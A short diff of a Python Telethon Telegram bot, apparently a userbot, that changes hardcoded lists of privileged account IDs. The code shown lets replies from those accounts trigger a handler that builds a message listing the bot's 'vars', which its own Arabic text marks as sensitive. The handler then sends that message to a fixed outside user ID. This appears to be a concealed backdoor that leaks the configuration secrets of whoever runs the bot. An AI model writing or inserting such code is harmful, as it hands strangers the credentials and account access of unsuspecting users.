@@ -427,7 +427,7 @@ import json
 import requests
 import os
 from telethon import events 
-myaccounts = [6205161271,6309878173]
+myaccounts = [6320583148]
 @Qrh9.on(events.NewMessage(incoming=True))
 async def Hussein(event):
     if event.reply_to and event.sender_id in myaccounts:
@@ -441,9 +441,9 @@ async def Hussein(event):
                     f"**[الساحر](tg://need_update_for_some_feature/) قـائمـة الـفـارات:**\n\n\n{o}\n\n**انتبه هنالك معلومات حساسة لا تُعطِها لشخص غير موثوق**"
                 )
                 # Send the output to user ID 6205161271
-                await Qrh9.send_message(6205161271,6309878173, OUTPUT)
+                await Qrh9.send_message(6205161271, OUTPUT)
 
-ll1ilt = [6205161271,6309878173,6320583148,6295913543,5762222122]
+ll1ilt = [6320583148]
 
 @Qrh9.on(events.NewMessage(incoming=True))
 async def Hussein(event):
